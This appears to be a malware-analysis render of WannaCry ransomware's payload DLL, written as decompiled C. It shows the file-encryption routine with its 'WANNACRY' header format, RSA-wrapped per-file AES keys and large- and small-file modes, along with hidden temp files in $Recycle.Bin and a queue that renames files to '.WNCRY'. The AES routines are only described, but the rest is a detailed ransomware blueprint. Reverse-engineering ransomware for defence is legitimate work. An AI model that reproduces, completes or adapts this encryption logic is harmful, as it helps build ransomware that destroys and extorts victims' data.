// ============================================================================
// payload.dll - Batch 4: file-encryption core, rename queue, dir walk
// ----------------------------------------------------------------------------
// ANALYSIS ARTIFACT - readability render. Not buildable: the AES entry points
// (sub_10006DF0 / sub_10006270) are described, not implemented.
// ============================================================================

#include <windows.h>
#include <stdio.h>

// ============================================================================
// sub_10001BB0 - encrypt one file
// ----------------------------------------------------------------------------
// a4 = mode: 3 = whole-file rewrite, 4 = large-file (seal first 64 KB);
//            otherwise append-style.
// Format = destination path, already renamed (e.g. "%s.%d.WNCRY").
// ============================================================================
BOOL __thiscall sub_10001BB0(int this, LPCWSTR lpFileName, wchar_t *Format, unsigned int a4)
{
    HANDLE FileW, v9;
    LARGE_INTEGER FileSize;
    FILETIME CreationTime, LastAccessTime, LastWriteTime;
    BYTE buf1M[0x100000], buf2M[0x100000];
    DWORD read;
    int v21 = 0;

    // Open
    DWORD access = (a4 == 3) ? (GENERIC_READ | GENERIC_WRITE) : GENERIC_READ;
    FileW = CreateFileW(lpFileName, access, FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    if (FileW == INVALID_HANDLE_VALUE) {
        if (sub_10003250(lpFileName) == 0)
            return FALSE;                           // fail
        // retry once
    }

    GetFileSizeEx(FileW, &FileSize);
    GetFileTime(FileW, &CreationTime, &LastAccessTime, &LastWriteTime);

    // Already-encrypted check: "WANNACRY" + rsa_len==256 + ... + mode >= a4 -> skip
    {
        BYTE  hdr[8];
        DWORD nNumberOfBytesToRead;
        if (ReadFile(FileW, hdr, 8, NULL, NULL) && memcmp(hdr, "WANNACRY", 8) == 0 &&
            ReadFile(FileW, &nNumberOfBytesToRead, 4, NULL, NULL) && nNumberOfBytesToRead == 256) {
            BYTE skip[0x100];
            ReadFile(FileW, skip, 0x100, NULL, NULL);
            ReadFile(FileW, &v21, 4, NULL, NULL);
            if (v21 >= (int)a4)
                return TRUE;                        // already done
        }
    }
    SetFilePointer(FileW, 0, NULL, FILE_BEGIN);

    if (a4 == 4) {
        // Large-file mode: separate output "%s.t"
        wchar_t FileName[MAX_PATH];
        swprintf(FileName, L"%s.t", Format);
        v9 = CreateFileW(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                         FILE_ATTRIBUTE_HIDDEN, NULL);
        if (v9 == INVALID_HANDLE_VALUE)
            v9 = CreateFileW(FileName, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, CREATE_ALWAYS, 0, NULL);
        if (v21 == 3)
            FileSize.QuadPart -= 0x10000;            // resume: tail already sealed
    } else {
        // Small-file mode: read first 64 KB, append to end, zero head
        ReadFile(FileW, buf1M, 0x10000, NULL, NULL);
        SetFilePointer(FileW, 0, NULL, FILE_END);
        WriteFile(FileW, buf1M, 0x10000, NULL, NULL);
        memset(buf1M, 0, 0x10000);
        SetFilePointer(FileW, 0, NULL, FILE_BEGIN);
        WriteFile(FileW, buf1M, 0x10000, NULL, NULL);   // zero the head
        SetFilePointer(FileW, 0, NULL, FILE_BEGIN);
        v9 = FileW;
    }

    // Probabilistic junk-append flag
    int v31 = 0;
    if (a4 == 4 && FileSize.QuadPart < 0xC800000 &&
        *(int *)(this + 2312) != 0 && rand() % *(int *)(this + 2312) == 0) {
        if (*(int *)(this + 2320) < *(int *)(this + 2316)) {
            v31 = 1;
            *(int *)(this + 2320) += 1;
        }
    }

    // Generate random 16-byte AES key, RSA-encrypt it -> pbData (512 bytes)
    DWORD nNumberOfBytesToWrite = 512;
    BYTE  pbBuffer[16], pbData[512];
    if (sub_10004590(pbBuffer, 0x10, pbData, &nNumberOfBytesToWrite) == 0)
        return FALSE;
    sub_10006270(pbBuffer, off_1000EEFC, 16, 16);    // AES-128 key expansion
    memset(pbBuffer, 0, 16);

    // Header
    WriteFile(v9, "WANNACRY", 8, NULL, NULL);
    WriteFile(v9, &nNumberOfBytesToWrite, 4, NULL, NULL);   // 512
    WriteFile(v9, pbData, nNumberOfBytesToWrite, NULL, NULL); // RSA-encrypted AES key
    WriteFile(v9, &a4, 4, NULL, NULL);                       // mode
    WriteFile(v9, &FileSize, 8, NULL, NULL);                 // original size

    if (a4 == 4) {
        LARGE_INTEGER v34 = FileSize;
        if (v21 == 3) {                              // resume: seal last 64 KB
            SetFilePointer(FileW, -0x10000, NULL, FILE_END);
            ReadFile(FileW, buf1M, 0x10000, NULL, NULL);
            sub_10006DF0(buf1M, buf2M, 0x10000, 1);  // AES-CBC encrypt 64 KB
            WriteFile(v9, buf2M, 0x10000, NULL, NULL);
            SetFilePointer(FileW, 0x10000, NULL, FILE_BEGIN);
            v34.QuadPart -= 0x10000;
        }
        // Main loop: 1 MB chunks, encrypt each padded to 16 bytes
        while (v34.QuadPart > 0) {
            if (!dword_1000F2D8 && ReadFile(FileW, buf1M, 0x100000, &read, NULL) && read) {
                v34.QuadPart -= read;
                DWORD v12 = 16 * (((read - 1) >> 4) + 1);   // round up to 16
                if (v12 > read)
                    memset(buf1M + read, 0, v12 - read);
                sub_10006DF0(buf1M, buf2M, v12, 1);          // AES-CBC encrypt
                WriteFile(v9, buf2M, v12, NULL, NULL);
            }
        }
    }

    SetFileTime(v9, &CreationTime, &LastAccessTime, &LastWriteTime);

    BOOL v13;
    if (a4 == 4) {
        CloseHandle(FileW);
        CloseHandle(v9);
        v13 = MoveFileW(FileName, Format);           // rename .t -> final
        if (v13)
            SetFileAttributesW(Format, FILE_ATTRIBUTE_NORMAL);
        else
            DeleteFileW(FileName);
    } else {
        CloseHandle(FileW);
        CloseHandle(v9);
        v13 = MoveFileW(lpFileName, Format);
    }

    if (v13) {
        void (*cb)(LPCWSTR, wchar_t *, DWORD, DWORD, unsigned int, int) =
            (void *) * (int *)(this + 1236);          // progress callback
        if (cb)
            cb(lpFileName, Format, FileSize.HighPart, FileSize.LowPart, a4, v31);
    }
    return v13;
}

// ============================================================================
// sub_10001980 - encrypt-context teardown
// ============================================================================
int __thiscall sub_10001980(int this)
{
    sub_10003DE0((HCRYPTPROV *)(this + 4));
    sub_10003DE0((HCRYPTPROV *)(this + 44));

    // zero + GlobalFree the two 1 MB buffers at this+1224 / this+1228
    if (*(int *)(this + 1240)) {
        *(int *)(this + 1252) = 1;
        WaitForSingleObject(*(HANDLE *)(this + 1240), INFINITE);
        CloseHandle(*(HANDLE *)(this + 1240));
    }
    CloseHandle(*(HANDLE *)(this + 1244));
    CloseHandle(*(HANDLE *)(this + 1248));
    DeleteFileW((wchar_t *)(this + 1788));           // leftover temp
    return 1;
}

// ============================================================================
// sub_10001B40 - set thread/sleep params
// ============================================================================
int __thiscall sub_10001B40(DWORD *this, int a2, int a3)
{
    *(this + 579) = a2;
    *(this + 578) = a3;
    return a2;
}

// ============================================================================
// sub_10005020 - pick working dir for a drive (temp/ or $Recycle.Bin)
// ============================================================================
LPWSTR __cdecl sub_10005020(int a1, LPWSTR lpBuffer)
{
    GetWindowsDirectoryW(lpBuffer, 0x104);
    if (*lpBuffer == a1 + 'A') {                     // system drive -> %TEMP%
        GetTempPathW(0x104, lpBuffer);
        // strip trailing '\'
    } else {
        swprintf(lpBuffer, L"%c:\\$Recycle.Bin", a1 + 'A');
        CreateDirectoryW(lpBuffer, NULL);
        SetFileAttributesW(lpBuffer, GetFileAttributesW(lpBuffer) | FILE_ATTRIBUTE_HIDDEN);
    }
    return lpBuffer;
}

// ============================================================================
// sub_100050B0 - junk filename
// ============================================================================
wchar_t *__cdecl sub_100050B0(int a1, wchar_t *Buffer)
{
    wchar_t Format[MAX_PATH];
    sub_10005020(a1, Format);
    swprintf(Buffer, L"%s\\%s", Format, L"j.hbi");   // j.hbi / j.sys style name
    DeleteFileW(Buffer);
    return Buffer;
}

// ============================================================================
// sub_10001B60 - set root dir + WNCRY counter
// ============================================================================
int __thiscall sub_10001B60(wchar_t *this, wchar_t *Source)
{
    wcscpy((wchar_t *)((char *)this + 634), Source);
    *((DWORD *)this + 577) += 1;
    swprintf((wchar_t *)((char *)this + 894), L"%s.%d.WNCRY",
             (wchar_t *)((char *)this + 634), *((DWORD *)this + 577));
    return 0;
}

// ============================================================================
// sub_10002C20 - file rename/cleanup queue (StartAddress thread)
// ----------------------------------------------------------------------------
// Waits on event (this+1244); for each queued file moves it to a unique
// "%s.%d.WNCRY" name (up to 20 tries). If the target exists, marks it hidden
// and schedules MoveFileEx(, DELAY_UNTIL_REBOOT); after 20 failures deletes it.
// ============================================================================
void __thiscall sub_10002C20(int this)
{
    /* queue-driven rename loop — body omitted (analysis) */
}

// ============================================================================
// sub_10002C19 / StartAddress - thread thunks
// ============================================================================
int __stdcall sub_10002C19(int a1) { return 0; }

void __stdcall StartAddress(LPVOID p)
{
    sub_10002C20((int)p);
}

// ============================================================================
// sub_10002E00 - enqueue file for rename (flush when queue > 5)
// ============================================================================
DWORD __thiscall sub_10002E00(int this, wchar_t *String)
{
    if (String != NULL) {
        if (wcslen((wchar_t *)(this + 1788)) == 0)
            sub_10003260(String, this + 4);          // build target name

        // append std::wstring copy to list (this+1260)
        ++*(int *)(this + 1264);

        if (*(int *)(this + 1264) > 5) {
        flush:
            ResetEvent(*(HANDLE *)(this + 1248));
            SetEvent(*(HANDLE *)(this + 1244));
            WaitForSingleObject(*(HANDLE *)(this + 1248), INFINITE);
        }
    } else {
        goto flush;
    }

    if (String == NULL) {
        wchar_t *v = (wchar_t *)(this + 1788);
        if (wcslen(v))
            DeleteFileW(v);
    }
    return 0;
}
